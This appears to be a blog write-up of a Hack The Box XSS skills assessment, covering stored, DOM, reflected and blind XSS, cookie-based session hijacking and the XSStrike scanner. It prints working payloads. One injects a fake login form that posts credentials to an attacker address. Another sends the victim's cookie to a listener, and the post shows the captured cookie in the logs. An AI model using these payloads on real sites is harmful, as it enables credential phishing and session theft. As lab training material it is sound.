> *"Why even bother with XSS? After all, it's just annoying pop-up windows..."* – these were likely the administrator's last words, moments before their session was silently stolen.

Even though Cross-Site Scripting (XSS) is a vulnerability that has been around almost since the dawn of the dynamic web, it still brazenly stays at the top of rankings like the OWASP Top 10. Why? Because web applications still have a massive problem separating what is "plain user data" from what is "executable code."

Recently, I was going through a *Skills Assessment* on Hack The Box. And while the XSS task itself was cracked quite quickly with a single, well-aimed payload, it inspired me to compile this topic into one solid, comprehensive guide.

In this post, we’re leaving behind the boring, dry theory of `alert(1)`. Instead, we’re going to get our hands dirty:

* 🔍 **We'll dissect the 3 main types of XSS** (Stored, DOM, and Reflected) – I’ve prepared screenshots for each so you can see exactly where and how the code is injected.
* 🥷 **We'll conduct a Blind XSS attack** on a live target (HTB module), proving that sometimes what isn't visible at first glance causes the most damage.
* 🛠️ **We'll fire up XSStrike** to show how to automate vulnerability hunting with built-in WAF (Web Application Firewall) bypass.

If you thought XSS was just JavaScript pranks, this post will quickly set you straight. Let's get started! 🚀

### 1. Stored XSS (Persistent) – The silent killer in the database

**Stored XSS**, also known as **Persistent XSS**, is widely considered the most critical variant of this vulnerability. While the *Reflected XSS* discussed later in the article can be compared to a boomerang, the stored version acts like a **landmine**. The attacker "buries" a malicious payload directly on the application server, where it remains active, waiting for an unsuspecting victim.

**Mechanism of action**
This vulnerability occurs in places where the application accepts user input and permanently stores it in the database without proper verification—for example, in comment systems, forums, or profile edit fields. The server saves the provided string and then renders it to every user visiting that specific subpage.

The critical error is the application's failure to distinguish between safe text data and executable code. During the analysis of a **Hack The Box** lab, I identified a "To-Do List" application. The mechanism for adding tasks permanently saved records in the database, which were then directly injected into the page's DOM structure. To verify the vulnerability and extract session data, I used a standard test vector:

```html
<script>alert(document.cookie)</script>
```

By adding this as a new "task," I injected the payload directly into the HTB application's database. From that moment on, the script became an integral part of the page. As soon as the page was reloaded, the browser read this entry, treated it as legitimate code, and popped up an alert window with the cookie. And this time, my long-awaited **flag** was hidden inside!

**The Catch:** In the real world, the attacker doesn't need to send the victim any suspicious links, which makes this attack extremely dangerous. The victim simply has to visit the infected subpage (e.g., open a forum thread with a malicious comment). On the other hand, it is a "loud" attack—it leaves a permanent trace in the database that administrators might notice.

![Alert popping up on the To-Do List page displaying a cookie with the HTB flag](/assets/img/posts/XSS/stored.png)

> *Fig 3. Stored XSS in practice – the malicious payload was saved as one of the tasks on the list and executes automatically every time the infected subpage is loaded, in this case revealing the flag: `HTB{570r3d_f0r_3v3ry0n3_70_533}`.*

### 2. DOM-based XSS – The attack the server never sees

This type of XSS is a completely different beast. While in Stored and Reflected XSS (discussed next), the malicious code passes through the server, in DOM-based XSS, the entire action happens **exclusively on the client-side** (in your browser).

**How it works**
The browser builds a page structure called the DOM (Document Object Model). If the JavaScript scripts used by the developers are written carelessly, they can pull data from the page or the URL and dynamically inject it onto the screen. The best example is anything located in the URL after the hash sign (`#`). Fragments after the hash are often not sent to the server at all!



If a developer uses an unsafe function such as `innerHTML` to paste this fragment onto the page, they open the door to an attack. In the next HTB task (again using the To-Do List application), I noticed that the task content was being pulled from the address bar, specifically from a variable after the hash sign (`#task=`). However, the application filtered standard `<script>` tags, so I had to change my tactics. I used a popular trick involving HTML events:

```javascript
<img src="" onerror=alert(document.cookie)>
```

**What exactly happened here?** We inject an image tag, but deliberately give it an empty source (`src=""`). The browser attempts to load the graphic, fails, and this generates an error. At this exact moment, the `onerror` event triggers, which obediently executes our defined JavaScript code. As a result, when we pasted our payload straight into the address bar, the browser dutifully executed it and popped an alert, with our coveted flag shining right inside it!

!https://www.w3schools.com/js/js_popup.asp(/assets/img/posts/XSS/DOM.png)
> *Fig 2. DOM-based XSS in practice. Instead of a classic script tag, an image loading error (`onerror`) passed directly in the URL fragment (`#task=`) was used to extract the flag: `HTB{pur3ly_cl13n7_51d3}`.*

### 3. Reflected XSS – The perfect tool for phishing

We already know the XSS mechanism from the previous points, but let's be honest—a pop-up window with a cookie is just for fun (or a proof of concept for Hack The Box). In the real world, cybercriminals use Reflected XSS for much more dangerous purposes, one of the most popular being **phishing**.

**How does it work?**
Imagine an attacker finds a Reflected XSS vulnerability on a trusted website, such as an online store's panel or a bank. Instead of stealing cookies, they decide to modify what the victim sees on the screen. Using JavaScript, they can completely overwrite the content of the original page, e.g., by injecting a fake login form.

As part of my testing, I prepared a payload that replaces the page content (using the `document.body.innerHTML` or `document.write` properties) and displays a "session expired" message:

![Original application before the attack](/assets/img/posts/XSS/reflected_before.png)

```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.22:1337><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script> <!--
```

When the victim clicks on a link containing such a payload, their browser will visit the **real and trusted domain** (e.g.`http://10.129.73.201/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.22%3A1337%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E++%3C%21--`), but the server will "reflect" our malicious script. As a result, the original page will disappear, and the victim will see a fake login form. Since the green padlock in the browser and the URL look correct, the chances of the victim entering their credentials there increase drastically.

![Fake login form and captured data in the terminal](/assets/img/posts/XSS/reflected_after.png)
> *Fig 3. Reflected XSS used for phishing. The attacker modifies the appearance ("defacement") of a trusted website in the victim's browser to steal login credentials.*

**The Catch:** A link injected with long HTML/JS code looks extremely suspicious. That's why attackers in phishing campaigns almost always hide it behind shortened URLs (e.g., bit.ly) or attach it to innocent-looking text in an email (e.g., "Check your order status").

### 4. Blind XSS – An attack in the dark, or setting snares for the administrator

Blind XSS is a variant of Stored XSS, but with one key difference: **the attacker never sees the moment their code executes**. You inject a payload into a contact form, bug report, or user registration and... nothing. The site simply thanks you for submitting the data. Your code lands in the database and waits until the victim (usually an unsuspecting administrator or moderator) opens their internal management panel, which is inaccessible to you.

Since we can't see the victim's screen, a classic `alert(1)` is completely useless here. We need to use **Out-of-Band (OOB)** techniques—our malicious script must silently "phone home" and send us the stolen data.

**How did it look in practice on Hack The Box?**

I came across a user registration form with a lovely message: *"Thank you for registering. An Admin will review your registration request."* This is a classic scenario for Blind XSS. The administrator will have to review my data, making it the perfect moment for an attack.

Because I didn't know exactly which form field was vulnerable (or if any were at all!), I decided to inject the payload everywhere possible, including URL parameters. However, to know which shot hit the mark, I personalized my payloads.

In the URL address, I used the following code:

```javascript
"><script>document.location='http://10.10.15.177:1337/?c=picture_'+document.cookie</script> 
```

And in the remaining text fields of the form, I modified the prefix:

```html
<script>document.location='http://10.10.15.177:1337/?c=field_name_'+document.cookie</script>
```

**What is happening here?** The script uses `document.location` to force the administrator's browser to visit my server (`10.10.15.177` on port `1337`). Additionally, it appends the content of their cookie (`document.cookie`) to the address, tagging it with the appropriate prefix (`picture_` or `name_`).

Before submitting the form, I had to set up my "listening server." Instead of complex tools, I used the simple built-in PHP server in the terminal:

```bash
sudo php -S 0.0.0.0:1337
```

![Filled form and running PHP server](/assets/img/posts/XSS/Blind1.png)
> *Fig 4. Casting the bait. A form peppered with Blind XSS payloads, and a PHP server ready to listen in the terminal.*

Next, I clicked "Register" and... started waiting. In the case of Blind XSS, patience is key, because the administrator (or in this case, a bot simulating their actions) must open the appropriate tab.

After a few minutes, my terminal finally came to life! A new request appeared in the server logs:

```zsh
[Thu Apr 23 21:46:51 2026] 10.129.234.166:49246 Accepted
[Thu Apr 23 21:46:51 2026] 10.129.234.166:49246 [404]: GET /?c=picture_cookie=c00k1355h0u1d8353cu23d - No such file or directory
```

**BAM! We got it.** Not only did I intercept the administrator's session cookie (`cookie=c00k1355h0u1d8353cu23d`), but thanks to my personalized payload, I immediately knew that the vulnerability was in the handling of the parameter responsible for the picture/URL (`picture_`), and not in the text fields!

![Captured cookie in the terminal logs](/assets/img/posts/XSS/Blind2.png)
> *Fig 5. Successful attack. The script executed in the administrator's browser and sent an HTTP request containing their session cookie to our server.*

What next? Just having the cookie is only half the battle. It still needs to be used to take over the administrator's session (so-called **Session Hijacking**). I navigated to the admin panel login page (`/hijacking/login.php`). Instead of guessing passwords, I opened the developer tools in the browser (F12), went to the "Storage" -> "Cookies" tab, and using the "plus" sign, manually added a new cookie. 

I entered the name corresponding to the session (`cookie`) and pasted the value stolen from the logs.

![Manually adding a cookie in the browser](/assets/img/posts/XSS/Session_hijacking.png)
> *Fig 6. Session Hijacking in practice. We replace our own cookie with the one stolen from the administrator using the browser's developer tools.*

After refreshing the page (F5), magic happened: the login form disappeared, and the server let me into the protected administrator panel without requiring any credentials!

### 5. Automation with XSStrike – A scalpel for bypassing filters

Manually tinkering with code and testing successive payloads is fun, but what if the application has dozens of parameters and filters our input along the way? That's when the heavy artillery comes into play – **XSStrike**.

Unlike standard fuzzers that simply inject thousands of lines from ready-made lists (wordlists) blindly, XSStrike is much smarter. This tool acts like a surgeon: first, it analyzes the server's response, checks the exact HTML context in which our parameter is "reflected," verifies the presence of a WAF (Web Application Firewall), and finally **dynamically generates** payloads perfectly tailored to the discovered vulnerability.

In the final *Skills Assessment* task on the Hack The Box platform, I stumbled upon a simple search engine. Instead of guessing, I passed the URL with the test parameter `?s=what` directly to the tool in the terminal:

```bash
python3 xsstrike.py -u "http://10.129.234.166/assessment/?s=what"
```

The result? The tool instantly analyzed the structure, checking DOM objects (catching, for example, the use of `document.write` and `location.hash`). It confirmed that the WAF was disabled (Status: Offline) and detected as many as 6 places where my `s` parameter was reflected. 

What's most impressive, however, is the generator itself. Based on this brief analysis, XSStrike created over 4,600 unique payloads! In the logs, we immediately see the highest-rated payloads (e.g., with an efficiency of 92-94%), which use clever tricks with weird encoding and rare events (like `OnPoINtEReNtEr`) to silently slip through the application's filters.

![Parameter analysis and payload generation by XSStrike](/assets/img/posts/XSS/XSStrike.png)

> *Fig 7. XSStrike in action. The tool thoroughly analyzes the HTB search engine, detects 6 reflections of the "s" parameter, and intelligently generates over 4,600 ready-to-use payloads.*

Thanks to the precise results from XSStrike, I was able to quickly identify that one of the parameters is vulnerable to **Blind XSS**. Using the same method as in point 4 (setting a "trap" with a PHP listening server), I injected a payload aimed at stealing the administrator's cookie. After a while, the coveted session ID appeared in the terminal logs. The final step was **Session Hijacking** once again—after manually setting the stolen cookie in the browser, I gained full access to the panel, successfully completing the entire Skills Assessment.

### Conclusion – XSS is more than just alert(1)

Going through the *Skills Assessment* on Hack The Box shows that Cross-Site Scripting remains one of the most dangerous weapons in the arsenal of a pentester and hacker. Although often underestimated, XSS in the hands of a skilled attacker becomes the key to confidential data.

**What did we learn from this lab?**

* **Variety is key:** From a simple **Stored XSS** that infects the database, through **DOM-based**, happening entirely in the browser, to **Reflected XSS**, which is the foundation of modern phishing.
* **Blind XSS is patience:** Attacking "in the dark" requires a strategic approach and the use of Out-of-Band (OOB) techniques, but the reward is often the highest level of privileges—an administrator session.
* **Automation gives an edge:** Tools like **XSStrike** don't replace knowledge, but they incredibly speed up the process of identifying the injection context and bypassing filters (WAF).
* **Session Hijacking is the ultimate goal:** Every single one of these attacks boiled down to one thing—stealing user identity. Swapping the session cookie is the shortest path to taking full control over an application.

XSS is an ongoing battle between the developer and the security researcher. The key to defense remains the golden rule: **never trust user input** and always use proper Output Encoding.
